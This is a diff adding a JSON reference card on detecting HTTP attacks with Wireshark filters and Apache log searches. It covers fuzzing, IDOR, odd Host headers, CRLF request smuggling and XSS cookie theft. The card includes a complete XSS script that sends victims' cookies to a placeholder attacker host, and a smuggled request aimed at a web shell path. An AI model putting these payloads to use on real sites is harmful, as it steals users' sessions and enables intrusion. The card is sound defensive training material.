@@ -1,0 +1,80 @@
+{
+  "id": "cdsa-m08-http-anomalies",
+  "name": "HTTP Anomaly Detection — Fuzzing, Strange Headers, CRLF & XSS",
+  "command": "http",
+  "description": "HTTP traffic analysis for malicious activity: directory fuzzing (rapid 404s from one host), parameter/IDOR fuzzing (sequential ID modification), strange Host headers (virtual host confusion), CRLF/HTTP request smuggling (injected CR+LF to split requests), and XSS cookie theft (JavaScript exfiltrating cookies via GET requests). Also covers Apache access log analysis to correlate Wireshark findings.",
+  "platform": "linux",
+  "type": "reference",
+  "opsec": "silent",
+  "category": "Network Traffic Analysis",
+  "subcategory": "HTTP Detection",
+  "certifications": ["CDSA"],
+  "source": "CDSA Module 08: Intermediate Network Traffic Analysis",
+  "tags": ["http", "fuzzing", "directory-fuzzing", "crlf", "xss", "host-header", "request-smuggling", "wireshark", "blue-team", "nta", "web"],
+  "mitre": ["T1595.003", "T1059.007", "T1190"],
+  "notes": "=== DIRECTORY FUZZING DETECTION ===\nHow it works:\n  → Attacker uses tools (ffuf, gobuster, dirb) to probe all possible web paths\n  → Sends rapid HTTP GET requests for paths that don't exist\n  → Discovers admin pages, backup files, config files, upload directories\n\nWireshark detection:\n  # All HTTP traffic\n  http\n  \n  # Only HTTP requests (filter out server responses)\n  http.request\n  \n  # Filter to suspected scanner IP\n  http.request and ((ip.src_host == <SCANNER_IP>) or (ip.dst_host == <SCANNER_IP>))\n  \n  # Look for 404 responses (not found = probed path doesn't exist)\n  http.response.code == 404\n\nApache log correlation:\n  # Filter by attacker IP\n  cat access.log | grep '<ATTACKER_IP>'\n  cat access.log | awk '$1 == \"<ATTACKER_IP>\"'\n  → Look for rapid GET requests to random filenames within same second\n  → Pattern: many lines with same timestamp, 404 response codes\n\nDirectory fuzzing IOCs:\n  → One host sending many HTTP requests in rapid succession\n  → Most responses are 404 (path doesn't exist)\n  → URLs contain common wordlist entries: /.git/HEAD, /.bash_history, /admin, /backup\n  → User-agent may be tool-specific (ffuf, gobuster, dirb)\n\n=== PARAMETER & IDOR FUZZING ===\nHow it works:\n  → Attacker fuzzes dynamic URL parameters: /user?id=1, /user?id=2, /user?id=3...\n  → Looking for IDOR (Insecure Direct Object Reference) — access unauthorized data\n  → Also fuzzes JSON body fields: change return=max to return=min\n\nWireshark detection:\n  # Filter to specific host requests\n  http.request and ((ip.src_host == <SCANNER_IP>) or (ip.dst_host == <SCANNER_IP>))\n  → Follow HTTP stream on any request to see full request/response\n  → Look for incrementing ID values in URL parameters\n  \n  # If attacker staggers requests (evasion) look at longer time window\n  → Apply time filter or adjust capture duration\n\n=== STRANGE HOST HEADERS ===\nHow it works:\n  → HTTP Host: header tells web server which virtual host to serve\n  → Attacker changes Host: to access restricted vhosts, localhost, or admin interfaces\n  → Tools: Burp Suite, curl -H 'Host: admin'\n\nWireshark detection:\n  # All HTTP then look for anomalous hosts\n  http\n  \n  # Filter requests where Host != expected server IP/domain\n  http.request and (!(http.host == \"<SERVER_IP>\"))\n  → Expand packet: HTTP → Host header field\n  → Look for: 127.0.0.1, admin, localhost, internal hostnames\n\n# Filter HTTP 400 Bad Request (often from smuggling or bad headers)\nhttp.response.code == 400\n\n=== CRLF / HTTP REQUEST SMUGGLING DETECTION ===\nHow it works:\n  → CRLF = Carriage Return (\\r) + Line Feed (\\n) = HTTP line separator\n  → Attacker URL-encodes CRLF (%0d%0a) in request parameters\n  → Server interprets as a second HTTP request → smuggled request\n  → CVE-2023-25690 (Apache mod_proxy)\n\nSmuggled request example (URL-decoded):\n  GET /login.php?id=1 HTTP/1.1\\r\\n\n  Host: 192.168.10.5\\r\\n\n  \\r\\n\n  GET /uploads/cmd.php HTTP/1.1\\r\\n   ← smuggled second request\n  Host: 127.0.0.1:8080\n\nWireshark detection:\n  # Find 400 responses (server rejected malformed request)\n  http.response.code == 400\n  → Follow HTTP stream on these → look for URL-encoded CRLF (%0d%0a) in request\n  \n  # If smuggling succeeds, look for 200 response to smuggled path\n  http.response.code == 200\n  → Cross-reference with paths that shouldn't be accessible\n\nApache config that enables smuggling:\n  RewriteRule with [P] (proxy) + user-controlled path = vulnerable to CRLF injection\n\n=== XSS COOKIE THEFT DETECTION ===\nHow it works:\n  → Attacker injects JavaScript into web page (via comment, form, URL parameter)\n  → JS runs in other users' browsers, sends their cookie to attacker's server\n  → GET request: http://<ATTACKER_IP>:<PORT>/?cookie=<VICTIM_COOKIE>\n\nExample injected script:\n  <script>\n    window.addEventListener('load', function() {\n      const url = 'http://<ATTACKER_IP>:5555';\n      const params = 'cookie=' + encodeURIComponent(document.cookie);\n      const request = new XMLHttpRequest();\n      request.open('GET', url + '?' + params);\n      request.send();\n    });\n  </script>\n\nWireshark detection:\n  # All HTTP requests going to external/unusual host\n  http\n  → Look for GET requests going to an IP that is NOT your web server\n  → URL will contain: /?cookie=... or similar\n  \n  # Filter by attacker's exfil server IP\n  http && ip.dst == <ATTACKER_EXFIL_IP>\n  → Follow stream → see stolen cookie value in URL parameters\n\nXSS IOCs:\n  → HTTP requests to unexpected internal IP (attacker's listener)\n  → URL contains 'cookie=' parameter\n  → Many victims sending to same external IP in short time\n  → Source web server has user-submitted content (comments, forms)\n\n=== RESPONSE CODE REFERENCE ===\n200 = Success\n400 = Bad Request (CRLF/smuggling attempts)\n403 = Forbidden (path exists but denied)\n404 = Not Found (fuzzing non-existent paths)\n500 = Server Error (injection/exploit attempt caused crash)",
+  "examples": [
+    {
+      "label": "Show all HTTP traffic",
+      "command": "http"
+    },
+    {
+      "label": "Show only HTTP requests (no responses)",
+      "command": "http.request"
+    },
+    {
+      "label": "HTTP requests from suspected scanner",
+      "command": "http.request and ((ip.src_host == <SCANNER_IP>) or (ip.dst_host == <SCANNER_IP>))"
+    },
+    {
+      "label": "Filter 404 responses (fuzzing IOC)",
+      "command": "http.response.code == 404"
+    },
+    {
+      "label": "Filter 400 responses (CRLF/bad request IOC)",
+      "command": "http.response.code == 400"
+    },
+    {
+      "label": "Find requests with non-standard Host headers",
+      "command": "http.request and (!(http.host == \"<REAL_SERVER_IP>\"))"
+    },
+    {
+      "label": "Filter by response code 200 (successful smuggled request)",
+      "command": "http.response.code == 200"
+    },
+    {
+      "label": "Apache log: filter by suspected scanner IP",
+      "command": "cat /var/log/apache2/access.log | grep '<SCANNER_IP>'"
+    },
+    {
+      "label": "Apache log: awk filter by source IP",
+      "command": "cat access.log | awk '$1 == \"<SCANNER_IP>\"'"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Intermediate Network Traffic Analysis",
+      "url": "https://academy.hackthebox.com/module/details/229"
+    },
+    {
+      "title": "MITRE ATT&CK - Exploit Public-Facing Application (T1190)",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+      "title": "CVE-2023-25690 Apache HTTP Request Smuggling",
+      "url": "https://github.com/dhmosfunk/CVE-2023-25690-POC"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m08-tunneling-detection",
+      "rel": "prereq",
+      "note": "Tunneling often uses HTTP/HTTPS as the transport — same detection approach."
+    },
+    {
+      "id": "cdsa-m08-ssl-dns-anomalies",
+      "rel": "next",
+      "note": "SSL renegotiation and DNS anomalies — HTTPS traffic and DNS exfil detection."
+    }
+  ]
+}
